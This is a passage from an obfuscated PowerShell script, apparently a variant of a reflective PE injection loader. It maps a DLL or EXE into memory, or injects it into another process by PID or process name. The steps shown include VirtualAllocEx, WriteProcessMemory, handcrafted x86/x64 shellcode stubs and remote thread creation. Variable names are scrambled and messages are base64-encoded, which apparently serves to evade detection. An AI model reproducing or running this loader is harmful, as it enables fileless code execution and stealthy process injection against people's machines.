				${__/\/=\_/====\_/=\} = $Win32Functions.VirtualAlloc.Invoke(${_/=\/\_/\_/\__/\/}, [UIntPtr]${__/\/==\_/\_/\_/\_}.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			}
			else
			{
				${__/\/=\_/====\_/=\} = $Win32Functions.VirtualAlloc.Invoke(${_/=\/\_/\_/\__/\/}, [UIntPtr]${__/\/==\_/\_/\_/\_}.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			}
			${__/==\/===\/\/\__} = ${__/\/=\_/====\_/=\}
		}
		[IntPtr]${/========\/\__/\_} = ____/\/===\__/\/== (${__/\/=\_/====\_/=\}) ([Int64]${__/\/==\_/\_/\_/\_}.SizeOfImage)
		if (${__/\/=\_/====\_/=\} -eq [IntPtr]::Zero)
		{ 
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBpAHIAdAB1AGEAbABBAGwAbABvAGMAIABmAGEAaQBsAGUAZAAgAHQAbwAgAGEAbABsAG8AYwBhAHQAZQAgAG0AZQBtAG8AcgB5ACAAZgBvAHIAIABQAEUALgAgAEkAZgAgAFAARQAgAGkAcwAgAG4AbwB0ACAAQQBTAEwAUgAgAGMAbwBtAHAAYQB0AGkAYgBsAGUALAAgAHQAcgB5ACAAcgB1AG4AbgBpAG4AZwAgAHQAaABlACAAcwBjAHIAaQBwAHQAIABpAG4AIABhACAAbgBlAHcAIABQAG8AdwBlAHIAUwBoAGUAbABsACAAcAByAG8AYwBlAHMAcwAgACgAdABoAGUAIABuAGUAdwAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIABwAHIAbwBjAGUAcwBzACAAdwBpAGwAbAAgAGgAYQB2AGUAIABhACAAZABpAGYAZgBlAHIAZQBuAHQAIABtAGUAbQBvAHIAeQAgAGwAYQB5AG8AdQB0ACwAIABzAG8AIAB0AGgAZQAgAGEAZABkAHIAZQBzAHMAIAB0AGgAZQAgAFAARQAgAHcAYQBuAHQAcwAgAG0AaQBnAGgAdAAgAGIAZQAgAGYAcgBlAGUAKQAuAA==')))
		}		
		[System.Runtime.InteropServices.Marshal]::Copy(${__/\/\/\/\/\/\_/\_}, 0, ${__/\/=\_/====\_/=\}, ${__/\/==\_/\_/\_/\_}.SizeOfHeaders) | Out-Null
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAdABpAG4AZwAgAGQAZQB0AGEAaQBsAGUAZAAgAFAARQAgAGkAbgBmAG8AcgBtAGEAdABpAG8AbgAgAGYAcgBvAG0AIAB0AGgAZQAgAGgAZQBhAGQAZQByAHMAIABsAG8AYQBkAGUAZAAgAGkAbgAgAG0AZQBtAG8AcgB5AA==')))
		${__/\/==\_/\_/\_/\_} = __/==\_/==\__/==\_ -__/\/=\_/====\_/=\ ${__/\/=\_/====\_/=\} -Win32Types $Win32Types -Win32Constants $Win32Constants
		${__/\/==\_/\_/\_/\_} | Add-Member -MemberType NoteProperty -Name EndAddress -Value ${/========\/\__/\_}
		${__/\/==\_/\_/\_/\_} | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value ${__/==\/===\/\/\__}
		Write-Verbose "StartAddress: $(____/=\__/=\_/==\/ ${__/\/=\_/====\_/=\})    EndAddress: $(____/=\__/=\_/==\/ ${/========\/\__/\_})"
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHAAeQAgAFAARQAgAHMAZQBjAHQAaQBvAG4AcwAgAGkAbgAgAHQAbwAgAG0AZQBtAG8AcgB5AA==')))
		__/\/=\_/====\/=\/ -__/\/\/\/\/\/\_/\_ ${__/\/\/\/\/\/\_/\_} -__/\/==\_/\_/\_/\_ ${__/\/==\_/\_/\_/\_} -Win32Functions $Win32Functions -Win32Types $Win32Types
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBwAGQAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGEAZABkAHIAZQBzAHMAZQBzACAAYgBhAHMAZQBkACAAbwBuACAAdwBoAGUAcgBlACAAdABoAGUAIABQAEUAIAB3AGEAcwAgAGEAYwB0AHUAYQBsAGwAeQAgAGwAbwBhAGQAZQBkACAAaQBuACAAbQBlAG0AbwByAHkA')))
		__/=\_____/=\__/== -__/\/==\_/\_/\_/\_ ${__/\/==\_/\_/\_/\_} -_/==\/=\/\__/\/\/\ ${_/==\/=\/\__/\/\/\} -Win32Constants $Win32Constants -Win32Types $Win32Types
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAHAAbwByAHQAIABEAEwATAAnAHMAIABuAGUAZQBkAGUAZAAgAGIAeQAgAHQAaABlACAAUABFACAAdwBlACAAYQByAGUAIABsAG8AYQBkAGkAbgBnAA==')))
		if (${__/\_/==\_/\/====} -eq $true)
		{
			_/===\___/\/====\_ -__/\/==\_/\_/\_/\_ ${__/\/==\_/\_/\_/\_} -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -__/\/=====\/==\___ ${__/\/=====\/==\___}
		}
		else
		{
			_/===\___/\/====\_ -__/\/==\_/\_/\_/\_ ${__/\/==\_/\_/\_/\_} -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
		}
		if (${__/\_/==\_/\/====} -eq $false)
		{
			if (${/=\_/\/==\/==\/\_} -eq $true)
			{
				Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBwAGQAYQB0AGUAIABtAGUAbQBvAHIAeQAgAHAAcgBvAHQAZQBjAHQAaQBvAG4AIABmAGwAYQBnAHMA')))
				__/=\__/=\/\/==\/\ -__/\/==\_/\_/\_/\_ ${__/\/==\_/\_/\_/\_} -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
			}
			else
			{
				Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAYgBlAGkAbgBnACAAcgBlAGYAbABlAGMAdABpAHYAZQBsAHkAIABsAG8AYQBkAGUAZAAgAGkAcwAgAG4AbwB0ACAAYwBvAG0AcABhAHQAaQBiAGwAZQAgAHcAaQB0AGgAIABOAFgAIABtAGUAbQBvAHIAeQAsACAAawBlAGUAcABpAG4AZwAgAG0AZQBtAG8AcgB5ACAAYQBzACAAcgBlAGEAZAAgAHcAcgBpAHQAZQAgAGUAeABlAGMAdQB0AGUA')))
			}
		}
		else
		{
			Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAYgBlAGkAbgBnACAAbABvAGEAZABlAGQAIABpAG4AIAB0AG8AIABhACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzACwAIABuAG8AdAAgAGEAZABqAHUAcwB0AGkAbgBnACAAbQBlAG0AbwByAHkAIABwAGUAcgBtAGkAcwBzAGkAbwBuAHMA')))
		}
		if (${__/\_/==\_/\/====} -eq $true)
		{
			[UInt32]${/===\__/\_/\_/\__} = 0
			${__/==\_/======\/=} = $Win32Functions.WriteProcessMemory.Invoke(${__/\/=====\/==\___}, ${__/==\/===\/\/\__}, ${__/\/=\_/====\_/=\}, [UIntPtr](${__/\/==\_/\_/\_/\_}.SizeOfImage), [Ref]${/===\__/\_/\_/\__})
			if (${__/==\_/======\/=} -eq $false)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAB3AHIAaQB0AGUAIABzAGgAZQBsAGwAYwBvAGQAZQAgAHQAbwAgAHIAZQBtAG8AdABlACAAcAByAG8AYwBlAHMAcwAgAG0AZQBtAG8AcgB5AC4A')))
			}
		}
		if (${__/\/==\_/\_/\_/\_}.FileType -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABMAEwA'))))
		{
			if (${__/\_/==\_/\/====} -eq $false)
			{
				Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwAgAGQAbABsAG0AYQBpAG4AIABzAG8AIAB0AGgAZQAgAEQATABMACAAawBuAG8AdwBzACAAaQB0ACAAaABhAHMAIABiAGUAZQBuACAAbABvAGEAZABlAGQA')))
				${__/\__/\/=\/\__/\} = ____/\/===\__/\/== (${__/\/==\_/\_/\_/\_}.PEHandle) (${__/\/==\_/\_/\_/\_}.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				${____/\/\/=\_/====} = ___/\/\/\/=\/=\/=\ @([IntPtr], [UInt32], [IntPtr]) ([Bool])
				${/=\_____/===\___/} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${__/\__/\/=\/\__/\}, ${____/\/\/=\_/====})
				${/=\_____/===\___/}.Invoke(${__/\/==\_/\_/\_/\_}.PEHandle, 1, [IntPtr]::Zero) | Out-Null
			}
			else
			{
				${__/\__/\/=\/\__/\} = ____/\/===\__/\/== (${__/==\/===\/\/\__}) (${__/\/==\_/\_/\_/\_}.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				if (${__/\/==\_/\_/\_/\_}.PE64Bit -eq $true)
				{
					${__/\/\__/\_/\/==\} = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
					${/========\_/\/\/\} = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
					${/===\/==\_/\/\/\/} = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
				}
				else
				{
					${__/\/\__/\_/\/==\} = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
					${/========\_/\/\/\} = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
					${/===\/==\_/\/\/\/} = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
				}
				${___/=\__/=\/\_/==} = ${__/\/\__/\_/\/==\}.Length + ${/========\_/\/\/\}.Length + ${/===\/==\_/\/\/\/}.Length + (${_/===\/\_/=\_/\_/} * 2)
				${__/\/\/==\/====\/} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${___/=\__/=\/\_/==})
				${__/\____/\______/} = ${__/\/\/==\/====\/}
				_/=\_/==\__/\/==\/ -___/\/\__/=\_/\_/\ ${__/\/\__/\_/\/==\} -_/=\/\/===\_/=\__/ ${__/\/\/==\/====\/}
				${__/\/\/==\/====\/} = ____/\/===\__/\/== ${__/\/\/==\/====\/} (${__/\/\__/\_/\/==\}.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr(${__/==\/===\/\/\__}, ${__/\/\/==\/====\/}, $false)
				${__/\/\/==\/====\/} = ____/\/===\__/\/== ${__/\/\/==\/====\/} (${_/===\/\_/=\_/\_/})
				_/=\_/==\__/\/==\/ -___/\/\__/=\_/\_/\ ${/========\_/\/\/\} -_/=\/\/===\_/=\__/ ${__/\/\/==\/====\/}
				${__/\/\/==\/====\/} = ____/\/===\__/\/== ${__/\/\/==\/====\/} (${/========\_/\/\/\}.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr(${__/\__/\/=\/\__/\}, ${__/\/\/==\/====\/}, $false)
				${__/\/\/==\/====\/} = ____/\/===\__/\/== ${__/\/\/==\/====\/} (${_/===\/\_/=\_/\_/})
				_/=\_/==\__/\/==\/ -___/\/\__/=\_/\_/\ ${/===\/==\_/\/\/\/} -_/=\/\/===\_/=\__/ ${__/\/\/==\/====\/}
				${__/\/\/==\/====\/} = ____/\/===\__/\/== ${__/\/\/==\/====\/} (${/===\/==\_/\/\/\/}.Length)
				${_/==\/=\/=\/=\/=\} = $Win32Functions.VirtualAllocEx.Invoke(${__/\/=====\/==\___}, [IntPtr]::Zero, [UIntPtr][UInt64]${___/=\__/=\/\_/==}, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
				if (${_/==\/=\/=\/=\/=\} -eq [IntPtr]::Zero)
				{
					Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzACAAZgBvAHIAIABzAGgAZQBsAGwAYwBvAGQAZQA=')))
				}
				${__/==\_/======\/=} = $Win32Functions.WriteProcessMemory.Invoke(${__/\/=====\/==\___}, ${_/==\/=\/=\/=\/=\}, ${__/\____/\______/}, [UIntPtr][UInt64]${___/=\__/=\/\_/==}, [Ref]${/===\__/\_/\_/\__})
				if ((${__/==\_/======\/=} -eq $false) -or ([UInt64]${/===\__/\_/\_/\__} -ne [UInt64]${___/=\__/=\/\_/==}))
				{
					Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAB3AHIAaQB0AGUAIABzAGgAZQBsAGwAYwBvAGQAZQAgAHQAbwAgAHIAZQBtAG8AdABlACAAcAByAG8AYwBlAHMAcwAgAG0AZQBtAG8AcgB5AC4A')))
				}
				${/=\_/=\/=\__/\___} = _/==\__/=\/\_____/ -_/==\/=\_/\_/==\__ ${__/\/=====\/==\___} -__/\_/====\_/====\ ${_/==\/=\/=\/=\/=\} -Win32Functions $Win32Functions
				${/==\/\___/\__/\__} = $Win32Functions.WaitForSingleObject.Invoke(${/=\_/=\/=\__/\___}, 20000)
				if (${/==\/\___/\__/\__} -ne 0)
				{
					Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEMAcgBlAGEAdABlAFIAZQBtAG8AdABlAFQAaAByAGUAYQBkACAAdABvACAAYwBhAGwAbAAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAgAGYAYQBpAGwAZQBkAC4A')))
				}
				$Win32Functions.VirtualFreeEx.Invoke(${__/\/=====\/==\___}, ${_/==\/=\/=\/=\/=\}, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			}
		}
		elseif (${__/\/==\_/\_/\_/\_}.FileType -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBYAEUA'))))
		{
			[IntPtr]${____/\/\/==\_/=\/\} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
			[System.Runtime.InteropServices.Marshal]::WriteByte(${____/\/\/==\_/=\/\}, 0, 0x00)
			${__/\/\__/\/=\/=\/} = _/=\/\/\_________/ -__/\/==\_/\_/\_/\_ ${__/\/==\_/\_/\_/\_} -Win32Functions $Win32Functions -Win32Constants $Win32Constants -___/\_/\___/\_/\/= ${_/=\__/\/\/=\_/\/\} -____/\/\/==\_/=\/\ ${____/\/\/==\_/=\/\}
			[IntPtr]${__/=\___/\/==\_/=} = ____/\/===\__/\/== (${__/\/==\_/\_/\_/\_}.PEHandle) (${__/\/==\_/\_/\_/\_}.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			Write-Verbose "Call EXE Main function. Address: $(____/=\__/=\_/==\/ ${__/=\___/\/==\_/=}). Creating thread for the EXE to run in."
			$Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, ${__/=\___/\/==\_/=}, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null
			while($true)
			{
				[Byte]${__/\_/=\_/\/\____} = [System.Runtime.InteropServices.Marshal]::ReadByte(${____/\/\/==\_/=\/\}, 0)
				if (${__/\_/=\_/\/\____} -eq 1)
				{
					___/\_/\/\/=\/=\/= -___/=\/=\__/\/\__/ ${__/\/\__/\/=\/=\/} -Win32Functions $Win32Functions -Win32Constants $Win32Constants
					Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBYAEUAIAB0AGgAcgBlAGEAZAAgAGgAYQBzACAAYwBvAG0AcABsAGUAdABlAGQALgA=')))
					break
				}
				else
				{
					sleep -Seconds 1
				}
			}
		}
		return @(${__/\/==\_/\_/\_/\_}.PEHandle, ${__/==\/===\/\/\__})
	}
	Function _/\_____/\/==\__/=
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		${__/\/=\_/====\_/=\}
		)
		$Win32Constants = __/===\/====\/\/\_
		$Win32Functions = __/\/======\/==\/\
		$Win32Types = __/\_/\/==\__/\_/=
		${__/\/==\_/\_/\_/\_} = __/==\_/==\__/==\_ -__/\/=\_/====\_/=\ ${__/\/=\_/====\_/=\} -Win32Types $Win32Types -Win32Constants $Win32Constants
		if (${__/\/==\_/\_/\_/\_}.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]${/=\/=\_/\/=\/====} = ____/\/===\__/\/== ([Int64]${__/\/==\_/\_/\_/\_}.PEHandle) ([Int64]${__/\/==\_/\_/\_/\_}.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			while ($true)
			{
				${___/=\/====\/\__/} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${/=\/=\_/\/=\/====}, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				if (${___/=\/====\/\__/}.Characteristics -eq 0 `
						-and ${___/=\/====\/\__/}.FirstThunk -eq 0 `
						-and ${___/=\/====\/\__/}.ForwarderChain -eq 0 `
						-and ${___/=\/====\/\__/}.Name -eq 0 `
						-and ${___/=\/====\/\__/}.TimeDateStamp -eq 0)
				{
					Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG4AZQAgAHUAbgBsAG8AYQBkAGkAbgBnACAAdABoAGUAIABsAGkAYgByAGEAcgBpAGUAcwAgAG4AZQBlAGQAZQBkACAAYgB5ACAAdABoAGUAIABQAEUA')))
					break
				}
				${__/\_/=\/\/\___/=} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((____/\/===\__/\/== ([Int64]${__/\/==\_/\_/\_/\_}.PEHandle) ([Int64]${___/=\/====\/\__/}.Name)))
				${/====\/\/\/\/\/=\} = $Win32Functions.GetModuleHandle.Invoke(${__/\_/=\/\/\___/=})
				if (${/====\/\/\/\/\/=\} -eq $null)
				{
					Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAZwBlAHQAdABpAG4AZwAgAEQATABMACAAaABhAG4AZABsAGUAIABpAG4AIABNAGUAbQBvAHIAeQBGAHIAZQBlAEwAaQBiAHIAYQByAHkALAAgAEQATABMAE4AYQBtAGUAOgAgACQAewBfAF8ALwBcAF8ALwA9AFwALwBcAC8AXABfAF8AXwAvAD0AfQAuACAAQwBvAG4AdABpAG4AdQBpAG4AZwAgAGEAbgB5AHcAYQB5AHMA'))) -WarningAction Continue
				}
				${__/==\_/======\/=} = $Win32Functions.FreeLibrary.Invoke(${/====\/\/\/\/\/=\})
				if (${__/==\_/======\/=} -eq $false)
				{
					Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABmAHIAZQBlACAAbABpAGIAcgBhAHIAeQA6ACAAJAB7AF8AXwAvAFwAXwAvAD0AXAAvAFwALwBcAF8AXwBfAC8APQB9AC4AIABDAG8AbgB0AGkAbgB1AGkAbgBnACAAYQBuAHkAdwBhAHkAcwAuAA=='))) -WarningAction Continue
				}
				${/=\/=\_/\/=\/====} = ____/\/===\__/\/== (${/=\/=\_/\/=\/====}) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwAgAGQAbABsAG0AYQBpAG4AIABzAG8AIAB0AGgAZQAgAEQATABMACAAawBuAG8AdwBzACAAaQB0ACAAaQBzACAAYgBlAGkAbgBnACAAdQBuAGwAbwBhAGQAZQBkAA==')))
		${__/\__/\/=\/\__/\} = ____/\/===\__/\/== (${__/\/==\_/\_/\_/\_}.PEHandle) (${__/\/==\_/\_/\_/\_}.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
		${____/\/\/=\_/====} = ___/\/\/\/=\/=\/=\ @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		${/=\_____/===\___/} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${__/\__/\/=\/\__/\}, ${____/\/\/=\_/====})
		${/=\_____/===\___/}.Invoke(${__/\/==\_/\_/\_/\_}.PEHandle, 0, [IntPtr]::Zero) | Out-Null
		${__/==\_/======\/=} = $Win32Functions.VirtualFree.Invoke(${__/\/=\_/====\_/=\}, [UInt64]0, $Win32Constants.MEM_RELEASE)
		if (${__/==\_/======\/=} -eq $false)
		{
			Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABjAGEAbABsACAAVgBpAHIAdAB1AGEAbABGAHIAZQBlACAAbwBuACAAdABoAGUAIABQAEUAJwBzACAAbQBlAG0AbwByAHkALgAgAEMAbwBuAHQAaQBuAHUAaQBuAGcAIABhAG4AeQB3AGEAeQBzAC4A'))) -WarningAction Continue
		}
	}
	Function _/=\__/\__/\_/==\/
	{
		$Win32Functions = __/\/======\/==\/\
		$Win32Types = __/\_/\/==\__/\_/=
		$Win32Constants =  __/===\/====\/\/\_
		${__/\/=====\/==\___} = [IntPtr]::Zero
		if ((${_______/\/=====\_/} -ne $null) -and (${_______/\/=====\_/} -ne 0) -and (${__/==\_/=\/==\_/\_} -ne $null) -and (${__/==\_/=\/==\_/\_} -ne ""))
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG4AJwB0ACAAcwB1AHAAcABsAHkAIABhACAAUAByAG8AYwBJAGQAIABhAG4AZAAgAFAAcgBvAGMATgBhAG0AZQAsACAAYwBoAG8AbwBzAGUAIABvAG4AZQAgAG8AcgAgAHQAaABlACAAbwB0AGgAZQByAA==')))
		}
		elseif (${__/==\_/=\/==\_/\_} -ne $null -and ${__/==\_/=\/==\_/\_} -ne "")
		{
			${_/\__/\/\/\/\__/=} = @(ps -Name ${__/==\_/=\/==\_/\_} -ErrorAction SilentlyContinue)
			if (${_/\__/\/\/\/\__/=}.Count -eq 0)
			{
				Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG4AJwB0ACAAZgBpAG4AZAAgAHAAcgBvAGMAZQBzAHMAIAAkAHsAXwBfAC8APQA9AFwAXwAvAD0AXAAvAD0APQBcAF8ALwBcAF8AfQA=')))
			}
			elseif (${_/\__/\/\/\/\__/=}.Count -gt 1)
			{
				${_____/\/\/\/\/===} = ps | where { $_.Name -eq ${__/==\_/=\/==\_/\_} } | select ProcessName, Id, SessionId
				echo ${_____/\/\/\/\/===}
				Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBvAHIAZQAgAHQAaABhAG4AIABvAG4AZQAgAGkAbgBzAHQAYQBuAGMAZQAgAG8AZgAgACQAewBfAF8ALwA9AD0AXABfAC8APQBcAC8APQA9AFwAXwAvAFwAXwB9ACAAZgBvAHUAbgBkACwAIABwAGwAZQBhAHMAZQAgAHMAcABlAGMAaQBmAHkAIAB0AGgAZQAgAHAAcgBvAGMAZQBzAHMAIABJAEQAIAB0AG8AIABpAG4AagBlAGMAdAAgAGkAbgAgAHQAbwAuAA==')))
			}
			else
			{
				${_______/\/=====\_/} = ${_/\__/\/\/\/\__/=}[0].ID
			}
		}
		if ((${_______/\/=====\_/} -ne $null) -and (${_______/\/=====\_/} -ne 0))
		{
			${__/\/=====\/==\___} = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, ${_______/\/=====\_/})
			if (${__/\/=====\/==\___} -eq [IntPtr]::Zero)
			{
				Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkAG4AJwB0ACAAbwBiAHQAYQBpAG4AIAB0AGgAZQAgAGgAYQBuAGQAbABlACAAZgBvAHIAIABwAHIAbwBjAGUAcwBzACAASQBEADoAIAAkAHsAXwBfAF8AXwBfAF8AXwAvAFwALwA9AD0APQA9AD0AXABfAC8AfQA=')))
			}
			Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBvAHQAIAB0AGgAZQAgAGgAYQBuAGQAbABlACAAZgBvAHIAIAB0AGgAZQAgAHIAZQBtAG8AdABlACAAcAByAG8AYwBlAHMAcwAgAHQAbwAgAGkAbgBqAGUAYwB0ACAAaQBuACAAdABvAA==')))
		}
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwAgAEkAbgB2AG8AawBlAC0ATQBlAG0AbwByAHkATABvAGEAZABMAGkAYgByAGEAcgB5AA==')))
		${__/\/=\_/====\_/=\} = [IntPtr]::Zero
		if (${__/\/=====\/==\___} -eq [IntPtr]::Zero)
		{
			${/=\_/=\_/\/=\____} = __/\_/\/===\/==\_/ -__/\/\/\/\/\/\_/\_ ${__/\/\/\/\/\/\_/\_} -_/=\__/\/\/=\_/\/\ ${_/=\__/\/\/=\_/\/\} -___/==\/\/\/\_____ ${___/==\/\/\/\_____}
		}
		else
		{
			${/=\_/=\_/\/=\____} = __/\_/\/===\/==\_/ -__/\/\/\/\/\/\_/\_ ${__/\/\/\/\/\/\_/\_} -_/=\__/\/\/=\_/\/\ ${_/=\__/\/\/=\_/\/\} -__/\/=====\/==\___ ${__/\/=====\/==\___} -___/==\/\/\/\_____ ${___/==\/\/\/\_____}
		}
		if (${/=\_/=\_/\/=\____} -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABsAG8AYQBkACAAUABFACwAIABoAGEAbgBkAGwAZQAgAHIAZQB0AHUAcgBuAGUAZAAgAGkAcwAgAE4AVQBMAEwA')))
		}
		${__/\/=\_/====\_/=\} = ${/=\_/=\_/\/=\____}[0]
		${_/\/==\___/\_/\/=} = ${/=\_/=\_/\/=\____}[1] 
		${__/\/==\_/\_/\_/\_} = __/==\_/==\__/==\_ -__/\/=\_/====\_/=\ ${__/\/=\_/====\_/=\} -Win32Types $Win32Types -Win32Constants $Win32Constants
		if ((${__/\/==\_/\_/\_/\_}.FileType -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABMAEwA')))) -and (${__/\/=====\/==\___} -eq [IntPtr]::Zero))
		{
	        switch (${__/=\_/==\/==\/\/\})
	        {
	            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBTAHQAcgBpAG4AZwA='))) {
	                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwAgAGYAdQBuAGMAdABpAG8AbgAgAHcAaQB0AGgAIABXAFMAdAByAGkAbgBnACAAcgBlAHQAdQByAG4AIAB0AHkAcABlAA==')))
				    [IntPtr]${/=\__/\_/=\_/\/\/} = __/===\__/\/\__/\/ -__/\/=\_/====\_/=\ ${__/\/=\_/====\_/=\} -_/==\/==\____/==\_ $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBTAHQAcgBpAG4AZwBGAHUAbgBjAA==')))
				    if (${/=\__/\_/=\_/\/\/} -eq [IntPtr]::Zero)
				    {
					    Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkAG4AJwB0ACAAZgBpAG4AZAAgAGYAdQBuAGMAdABpAG8AbgAgAGEAZABkAHIAZQBzAHMALgA=')))
				    }
				    ${/=\/==\_/\_/\_/==} = ___/\/\/\/=\/=\/=\ @() ([IntPtr])
				    ${/==\_____/\/\__/=} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/=\__/\_/=\_/\/\/}, ${/=\/==\_/\_/\_/==})
				    [IntPtr]${_/=\_/=\/\_/==\_/} = ${/==\_____/\/\__/=}.Invoke()
				    ${___/\____/\___/==} = [System.Runtime.InteropServices.Marshal]::PtrToStringUni(${_/=\_/=\/\_/==\_/})
				    echo ${___/\____/\___/==}
	            }
	            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAaQBuAGcA'))) {
	                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwAgAGYAdQBuAGMAdABpAG8AbgAgAHcAaQB0AGgAIABTAHQAcgBpAG4AZwAgAHIAZQB0AHUAcgBuACAAdAB5AHAAZQA=')))
				    [IntPtr]${_/\__/=\/\/\/====} = __/===\__/\/\__/\/ -__/\/=\_/====\_/=\ ${__/\/=\_/====\_/=\} -_/==\/==\____/==\_ $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAaQBuAGcARgB1AG4AYwA=')))
				    if (${_/\__/=\/\/\/====} -eq [IntPtr]::Zero)
				    {
					    Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkAG4AJwB0ACAAZgBpAG4AZAAgAGYAdQBuAGMAdABpAG8AbgAgAGEAZABkAHIAZQBzAHMALgA=')))
				    }
